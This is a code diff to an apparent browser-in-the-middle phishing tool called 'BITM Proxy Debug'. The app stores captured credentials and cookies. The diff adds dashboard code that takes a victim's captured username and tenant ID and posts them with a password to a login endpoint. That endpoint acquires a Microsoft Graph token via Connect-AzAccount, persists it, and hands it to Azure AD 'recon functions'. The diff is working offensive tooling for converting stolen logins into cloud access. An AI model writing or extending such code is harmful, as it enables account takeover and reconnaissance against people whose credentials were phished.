@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.40.3")
+app = FastAPI(title="BITM Proxy Debug", version="1.41.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -7846,7 +7846,7 @@ function renderCreds(){
           <div id="aaa-panel-${site.id}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
             <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
               <label style="color:#94a3b8;font-size:13px">Function:</label>
-              <select id="aaa-fn-${site.id}" class="cfg-input" style="min-width:280px;font-size:13px"></select>
+              <select id="aaa-fn-${site.id}" class="cfg-input" style="min-width:280px;font-size:13px" data-user="${esc((guessUserPass(d).guessUser)||'')}" data-tid="${esc((configCache.default_tenant_id||'').trim())}" onchange="aaaFnChange('${site.id}')"></select>
               <label style="color:#94a3b8;font-size:13px;margin-left:6px">Token:</label>
               <select id="aaa-tok-${site.id}" class="cfg-input" style="min-width:160px;font-size:13px">
                 ${(d.tokens||[]).map((t,i)=>`<option value="${i}">tokens[${i}] (${esc((t.source_url||'').slice(0,40))})</option>`).join('')||'<option value="0">(no tokens)</option>'}
@@ -8323,9 +8323,42 @@ async function aaaTogglePanel(siteId){
       status.innerHTML='<span style="color:#f87171">disabled — '+reasons.join('; ')+'</span>';
       return;
     }
-    sel.innerHTML=(info.allowed_functions||[]).map(f=>`<option value="${esc(f)}">${esc(f)}</option>`).join('');
+    // Get-AAATokenFromAzLogin is a token *getter* (acquires a Graph token via
+    // Connect-AzAccount), not a recon function that consumes one — so it heads
+    // the list and Run routes it to /api/aaa/login (see aaaRun).
+    const _getter=`<option value="Get-AAATokenFromAzLogin">Get-AAATokenFromAzLogin — acquire a token (login)</option>`;
+    sel.innerHTML=_getter+(info.allowed_functions||[]).map(f=>`<option value="${esc(f)}">${esc(f)}</option>`).join('');
     status.innerHTML='<span style="color:#78859b">'+info.allowed_functions.length+' functions available · pwsh '+esc(info.pwsh.detail.split(' ')[0]||'ok')+'</span>';
+    aaaFnChange(siteId); // pre-fill args for the initial selection
   }
+}
+// Populate the args field from the selected function's parsed params:
+// mandatory params pre-filled (switches bare, strings as -Name ''), the full
+// param set surfaced in the tooltip. Get-AAATokenFromAzLogin gets a
+// -User/-Password/-TenantId template seeded from the captured creds.
+function aaaFnChange(siteId){
+  const sel=document.getElementById('aaa-fn-'+siteId);
+  const argsEl=document.getElementById('aaa-args-'+siteId);
+  if(!sel||!argsEl)return;
+  const fn=sel.value;
+  if(fn==='Get-AAATokenFromAzLogin'){
+    const u=(sel.dataset.user||'').replace(/'/g,"''"), t=(sel.dataset.tid||'').replace(/'/g,"''");
+    argsEl.value=`-User '${u}' -Password '' -TenantId '${t}'`;
+    argsEl.title="Acquire a Graph token via Connect-AzAccount. Fill -Password. Captured creds are a USER login — do NOT add -ServicePrincipal (that's only for an app client-id + secret). Run routes to /api/aaa/login.";
+    return;
+  }
+  const fp=(aaaInfoCache&&aaaInfoCache.function_params)||{};
+  const params=fp[fn]||[];
+  const mand=params.filter(p=>p.mandatory);
+  // Respect PowerShell parameter sets: mandatory switches in different named
+  // sets are mutually exclusive, so pre-fill only the first named set (+ any
+  // setless mandatory params, which are common to all sets).
+  const sets=[...new Set(mand.filter(p=>p.set).map(p=>p.set))];
+  const chosen=sets.length>1?mand.filter(p=>!p.set||p.set===sets[0]):mand;
+  argsEl.value=chosen.map(p=>p.switch?('-'+p.name):(`-${p.name} ''`)).join(' ');
+  argsEl.title=params.length
+    ?'params ('+String.fromCharCode(42)+' = required): '+params.map(p=>(p.mandatory?String.fromCharCode(42):'')+'-'+p.name+(p.switch?'':" ''")+(p.set?(' ['+p.set+']'):'')).join('  ')
+    :'no parameters — just Run';
 }
 function aaaParseArgs(s){
   // Tokenize a PowerShell-ish arg line: -Name 'value with spaces' -Other "v" Bare
@@ -8352,6 +8385,10 @@ async function aaaRun(siteId){
   const tokIdx=parseInt(document.getElementById('aaa-tok-'+siteId)?.value||'0',10)||0;
   const out=document.getElementById('aaa-result-'+siteId);
   if(!fn){out.innerHTML='<div style="color:#f87171">pick a function first</div>';return}
+  // The token-getter isn't a /api/aaa/run recon call — it acquires a token via
+  // Connect-AzAccount, so route it to /api/aaa/login parsing the -User /
+  // -Password / -TenantId (and optional -ServicePrincipal) from the args.
+  if(fn==='Get-AAATokenFromAzLogin'){return aaaRunTokenGetter(siteId,argsStr,out)}
   out.innerHTML='<div style="color:#94a3b8">Running '+esc(fn)+'…</div>';
   let parsed;
   try{parsed=aaaParseArgs(argsStr)}catch(e){out.innerHTML='<div style="color:#f87171">Bad args: '+esc(String(e))+'</div>';return}
@@ -8372,6 +8409,26 @@ async function aaaRun(siteId){
       html+='<div style="margin-top:6px;color:#fca5a5;font-size:12px;font-weight:600">stderr:</div><pre style="background:#1e0a0a;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#fecaca;font-size:12px;font-family:monospace">'+esc(d.stderr)+'</pre>';
     }
     out.innerHTML=html;
+  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
+}
+// Run the token-getter selected in the function dropdown: parse -User /
+// -Password / -TenantId (and optional -ServicePrincipal) from the args line
+// and POST /api/aaa/login, which acquires + stashes a Graph token.
+async function aaaRunTokenGetter(siteId,argsStr,out){
+  let parsed;
+  try{parsed=aaaParseArgs(argsStr)}catch(e){out.innerHTML='<div style="color:#f87171">Bad args: '+esc(String(e))+'</div>';return}
+  const byName={};parsed.forEach(a=>{if(a.name)byName[a.name.toLowerCase()]=(a.value!==undefined?a.value:true)});
+  const user=byName['user']||'',password=byName['password']||'',tid=byName['tenantid']||'';
+  const sp=byName['serviceprincipal']===true;
+  if(!user||!password||!tid){out.innerHTML='<div style="color:#f87171">Get-AAATokenFromAzLogin needs -User, -Password and -TenantId</div>';return}
+  out.innerHTML='<div style="color:#94a3b8">Connecting (Az.Accounts → Get-AzAccessToken)…</div>';
+  try{
+    const r=await apiFetch('/api/aaa/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,user:user,password:password,tenant_id:tid,service_principal:sp})});
+    const d=await r.json();
+    if(!d.ok){out.innerHTML='<div style="color:#f87171">'+esc(d.error||'failed')+'</div>'+(d.stderr?'<details style="margin-top:6px"><summary style="cursor:pointer;color:#94a3b8;font-size:12px">stderr</summary><pre style="background:#1e0a0a;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#fecaca;font-size:11px;font-family:monospace">'+esc(d.stderr)+'</pre></details>':'');return}
+    const tok=d.access_token||'';
+    out.innerHTML=`<div style="color:#4ade80;margin-bottom:4px">✓ token captured (${tok.length} bytes, ${d.elapsed_ms}ms)${d.persisted?' · persisted to credentials':''}</div><div style="color:#78859b;font-size:12px">Now pick a recon function above and Run — it uses this token.</div>`;
+    send({cmd:'get_sites'}); // refresh so the new token shows in the Token dropdown
   }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
 }
 function aaaLoginToggle(siteId){
